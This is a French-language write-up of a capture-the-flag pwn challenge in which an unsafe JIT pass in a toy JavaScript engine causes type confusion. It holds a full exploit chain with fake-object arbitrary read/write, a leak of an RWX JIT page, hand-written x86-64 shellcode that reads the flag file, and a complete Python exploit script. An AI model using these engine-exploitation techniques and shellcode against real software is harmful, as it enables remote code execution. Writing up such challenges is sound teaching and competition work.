# Forge Collapse — writeup

- **CTF** : Hack Ton Lycée (HTL) 2026
- **Catégorie** : pwn — **834 pts** (44 solves)
- **Remote** : `nc pwn.ctf.yogosha.com 30001`
- **Binaire** : moteur JavaScript-subset avec JIT optimisant (`engine.c`).

## Énoncé

`forge` est un petit moteur JS avec un JIT baseline. On envoie un programme
source, il est parsé en bytecode et exécuté ; toute fonction qui devient *hot*
est compilée en natif après quelques passes de « redundancy elimination » sur
son IR. **Une de ces passes est non sûre.** Il faut trouver la miscompilation,
la transformer en primitive de corruption mémoire, et lire `/srv/flag.txt`.

## Modèle

- Valeurs **NaN-boxées** : `double v == rawbits(v) + (1<<48)` ; un pointeur heap
  est un mot `< 1<<48`.
- Les tableaux se spécialisent par *elements kind* :
  - `KIND_DOUBLE` : stocke des doubles bruts (non boxés) ;
  - `KIND_OBJECT` : stocke des `Value` boxées (dont des pointeurs).
  - Un `store` d'une valeur dont la représentation ne matche pas le kind courant
    **bascule le kind** et réécrit le slot.
- Le JIT épingle `observed_kind` (le dernier kind vu à l'interprétation) et émet
  un `CHECKMAP` : `cmp [array+4], kind ; jne bail` qui retombe à l'interpréteur
  si le kind a changé.

## La vulnérabilité : `pass_checkmap_elim` non sûre

```c
// Pass B : supprime un CheckMap dominé par un CheckMap antérieur sur la MÊME base.
static int is_barrier(int op) { return op == IR_RET; }  // seul RET réinitialise
```

La passe retire un `CHECKMAP` si un `CHECKMAP` antérieur a déjà « prouvé » la
même base — **mais un `SETELEM` entre les deux n'est pas une barrière**. Or un
`SETELEM` peut **changer le kind du tableau** (transition DOUBLE↔OBJECT). Le
deuxième `CHECKMAP`, celui qui aurait détecté le nouveau kind, est éliminé.

Résultat : un `GETELEM` compilé continue d'utiliser le `kind` **épinglé**
(p.ex. DOUBLE : `add rax, DOUBLE_OFFSET`) alors que le slot contient désormais
une représentation OBJECT (un pointeur brut), ou l'inverse → **type confusion**
entre double non boxé et pointeur boxé.

> La passe `pass_load_cse` (Pass A) est un leurre : elle est inerte (ne touche
> que des valeurs, jamais une hypothèse de map).

## Les primitives : NaN-boxing

La miscompilation JIT donne déjà une type confusion double ⇄ pointeur. Mais le
moteur offre les mêmes primitives **plus directement**, via ses builtins de
manipulation de bits, et c'est ce que l'exploit ci-dessous utilise :

- **`addrof(o)` = `send(o)`** : `send` écrit `val_is_ptr(v) ? v : unbox_raw(v)`.
  Pour un objet, il écrit donc le **pointeur brut**.
- **`fakeobj(addr)` = `u64(hi, lo)`** : `u64` fabrique un `Value` dont les bits
  valent une adresse. Si cette adresse est `< 2^48`, `val_is_ptr()` la considère
  comme un **pointeur**. Et `OP_GETIDX`/`OP_SETIDX` **ne vérifient pas le
  celltype** de la base → n'importe quel pointeur forgé est utilisé comme `Array`.

> C'est la même faille de fond que le JIT (confondre bits bruts et pointeur),
> exposée au niveau langage. On peut faire tout l'exploit sans même déclencher
> le bug du JIT — sauf l'étape finale, qui a besoin d'une page exécutable.

## Exploitation pas à pas

Harnais : on envoie un `u32` de longueur + la source ; la sortie arrive via les
`send(...)` (8 octets bruts chacun).

**Étape 1 — addrof.** `send(obj)` renvoie l'adresse de la cellule. Les deux
tableaux sont contigus dans l'arène (cellule `0x18` + backing).

```js
var a = [1,2,3];  var b = [4,5,6];
send(a);  send(b);     // deux pointeurs bruts dans l'arène
```

**Étape 2 — lecture arbitraire via faux `Array`.** On écrit un faux header
`Array` dans le backing d'un tableau DOUBLE (via `u64`, qui stocke des qwords
bruts), puis on fabrique un pointeur dessus avec `u64(hi, lo)`. Le champ
`elements` pointe vers la mémoire à lire.

```js
var victim = [1.25, 2.5, 3.75];
var ctrl   = [0,0,0,0,0,0,0,0];
ctrl[0] = u64(0, 0);                        // celltype=0 (ARRAY), kind=0 (DOUBLE)
ctrl[1] = u64(256, 256);                    // length, capacity
ctrl[2] = u64(hi(victim), lo(victim) + 24); // elements -> backing de victim (cell+0x18)
var fake = u64(hi(ctrl), lo(ctrl) + 24);    // fakeobj(ctrl backing)
send(fake[0]);  // = bits de victim[0] (1.25) : lecture arbitraire OK
```

> `hi(o)`/`lo(o)` donnent les deux moitiés de `ptr - OFFSET` ; `u64` les
> recombine, d'où l'arithmétique `lo(...) + 24` pour viser `cell + 0x18`.

**Étape 3 — une page exécutable (RWX).** Les pages JIT sont `mmap(... PROT_EXEC)`
(`jit_emit`). On rend une fonction *hot* (`HOT = 50`) pour en obtenir une, le
corps restant dans le sous-ensemble JIT-able (`ir_build` : get/set à index
constant, moves, `return`).

```js
function j(a){ return a[0]; }
var wa=[1,2,3];
var i=0; while(i<80){ j(wa); i=i+1; }       // compile j -> page RWX
```

**Étape 4 — fuiter `FuncCell.code`.** Un faux `Array` dont `elements` pointe sur
la `FuncCell` de `j` permet de lire son champ `code` (offset `+8`) = l'adresse de
la page RWX.

```js
var cR=[0,0,0,0,0,0,0,0];
cR[0]=u64(0,0);  cR[1]=u64(65536,65536);
cR[2]=u64(hi(j), lo(j));                     // elements -> FuncCell(j)
var fr=u64(hi(cR), lo(cR)+24);
var ch=hi(fr[1]);  var cl=lo(fr[1]);         // code = *(FuncCell+8)
```

**Étape 5 — écrire le shellcode et sauter dedans.** Un second faux `Array` dont
`elements` = la page RWX permet d'y écrire le shellcode (`open`/`read`/`write`
de `/srv/flag.txt` vers le fd 1, qui est la socket via `dup2`). Rappeler `j`
exécute la page.

```js
var cW=[0,0,0,0,0,0,0,0];
cW[0]=u64(0,0);  cW[1]=u64(65536,65536);
cW[2]=u64(ch, cl);                           // elements -> page code
var fw=u64(hi(cW), lo(cW)+24);
fw[0]=u64(...); fw[1]=u64(...); /* ... chunks du shellcode ... */
j(wa);                                       // -> exécute le shellcode
```

## Exploit complet

Sockets + shellcode, sans dépendance — **testé en local** contre le binaire
`engine` fourni (exécution de code confirmée). Lancement :

```
python3 exploit.py pwn.ctf.yogosha.com 30001
```

Script intégral :

```python
#!/usr/bin/env python3
# Forge Collapse (HTL 2026) — exploit autonome (sockets, sans dépendance).
import sys, struct, socket

OFFSET = 0x0001000000000000

def run_src(src, host, port):
    s = socket.create_connection((host, port), timeout=8); s.settimeout(3)
    b = src.encode() if isinstance(src, str) else src
    s.sendall(struct.pack("<I", len(b)) + b)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out

def shellcode(path=b"/srv/flag.txt"):
    s = path + b"\x00"
    s += b"\x00" * ((-len(s)) % 8)
    sc = b""
    for i in range(len(s) - 8, -8, -8):        # push la string (chunks de 8)
        sc += b"\x48\xb8" + s[i:i+8] + b"\x50"  # movabs rax, chunk ; push rax
    sc += b"\x48\x89\xe7"                        # mov rdi, rsp
    sc += b"\x31\xf6\x31\xd2"                    # xor esi,esi ; xor edx,edx
    sc += b"\xb8\x02\x00\x00\x00\x0f\x05"        # mov eax,2 (open) ; syscall
    sc += b"\x89\xc7\x48\x89\xe6"                # mov edi,eax ; mov rsi,rsp
    sc += b"\xba\x00\x01\x00\x00"                # mov edx,0x100
    sc += b"\x31\xc0\x0f\x05"                    # xor eax,eax (read) ; syscall
    sc += b"\x89\xc2\xbf\x01\x00\x00\x00"        # mov edx,eax ; mov edi,1 (socket)
    sc += b"\x48\x89\xe6"                        # mov rsi,rsp
    sc += b"\xb8\x01\x00\x00\x00\x0f\x05"        # mov eax,1 (write) ; syscall
    sc += b"\xbf\x00\x00\x00\x00"                # mov edi,0
    sc += b"\xb8\x3c\x00\x00\x00\x0f\x05"        # mov eax,60 (exit) ; syscall
    return sc

def exploit(host, port, flagpath=b"/srv/flag.txt"):
    sc = shellcode(flagpath)
    sc += b"\x90" * ((-len(sc)) % 8)
    chunks = [struct.unpack("<Q", sc[i:i+8])[0] for i in range(0, len(sc), 8)]

    js  = "function j(a){ return a[0]; }\n"
    js += "var wa=[1,2,3];\n"
    js += "var i=0; while(i<80){ j(wa); i=i+1; }\n"   # HOT=50 => JIT => page RWX
    # lecture : faux Array au-dessus de FuncCell(j) pour fuiter code
    js += "var cR=[0,0,0,0,0,0,0,0];\n"
    js += "cR[0]=u64(0,0);\n"                         # celltype=0 (ARRAY), kind=0 (DOUBLE)
    js += "cR[1]=u64(65536,65536);\n"                 # length, capacity
    js += "cR[2]=u64(hi(j),lo(j));\n"                 # elements -> FuncCell(j)
    js += "var fr=u64(hi(cR),lo(cR)+24);\n"           # fakeobj(cR backing)
    js += "var ch=hi(fr[1]); var cl=lo(fr[1]);\n"     # FuncCell.code (offset +8)
    # ecriture : faux Array au-dessus de la page RWX
    js += "var cW=[0,0,0,0,0,0,0,0];\n"
    js += "cW[0]=u64(0,0); cW[1]=u64(65536,65536);\n"
    js += "cW[2]=u64(ch,cl);\n"                        # elements -> page code
    js += "var fw=u64(hi(cW),lo(cW)+24);\n"
    for idx, q in enumerate(chunks):
        js += "fw[%d]=u64(%d,%d);\n" % (idx, (q >> 32) & 0xffffffff, q & 0xffffffff)
    js += "j(wa);\n"                                   # saute dans le shellcode
    return run_src(js, host, port)

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9101
    fp   = sys.argv[3].encode() if len(sys.argv) > 3 else b"/srv/flag.txt"
    out = exploit(host, port, fp)
    print("raw out:", out)
    i = out.find(b"HTL{")
    if i >= 0:
        print("FLAG:", out[i:out.find(b'}', i)+1].decode(errors="replace"))
```

## Points clés

- Bug « officiel » : **`pass_checkmap_elim` ignore les `SETELEM` changeant de
  kind** (`is_barrier` ne couvre que `IR_RET`) → type confusion dans le code JIT.
- Même faille au niveau langage : `u64`/`send` + **absence de check celltype**
  dans `GETIDX`/`SETIDX` → `addrof`/`fakeobj` immédiats → R/W arbitraire.
- Exécution : **pages JIT RWX** → shellcode direct pour lire `/srv/flag.txt`.

## Flag

`HTL{one_alias_the_jit_forgot}` (lu depuis `/srv/flag.txt` par le shellcode exécuté dans une page JIT).
